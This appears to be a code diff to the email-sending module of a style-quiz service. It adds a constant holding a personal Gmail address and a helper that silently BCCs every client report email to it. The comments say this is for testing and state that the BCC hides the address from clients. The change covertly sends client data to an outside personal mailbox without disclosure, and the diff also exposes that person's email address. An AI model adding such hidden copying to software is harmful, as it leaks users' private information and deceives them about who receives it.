@@ -4,6 +4,24 @@ import { QuizSubmission, StyleResult, EmailTemplate } from './types';
 import { generateResponseBreakdown } from './scoring';
 import { logger } from './logger';
 
+/**
+ * Testing: Mary Michele gets a hidden copy of every report email, so she can
+ * review what clients receive. Remove this address when testing ends.
+ */
+export const REPORT_COPY_RECIPIENT = 'marymichelenidiffer@gmail.com';
+
+/**
+ * Add the testing copy as a BCC, so the client never sees the address.
+ * Skipped when that address is already the recipient, to avoid duplicates.
+ */
+export function withReportCopy<T extends EmailTemplate>(
+  emailData: T,
+): T & { bcc?: string } {
+  const recipients = emailData.to.toLowerCase().split(/[,;]\s*/);
+  if (recipients.includes(REPORT_COPY_RECIPIENT.toLowerCase())) return emailData;
+  return { ...emailData, bcc: REPORT_COPY_RECIPIENT };
+}
+
 // Rate limiting tracking
 const emailSentCount = new Map<string, { count: number; resetTime: number }>();
 
@@ -229,7 +247,7 @@ export async function sendEmail(emailData: EmailTemplate): Promise<boolean> {
     
     // Add sender info if not present
     const emailWithSender = {
-      ...emailData,
+      ...withReportCopy(emailData),
       from: emailData.from || process.env.SMTP_USER || 'noreply@stylefinder.com',
       replyTo: process.env.COACH_EMAIL || emailData.to
     };
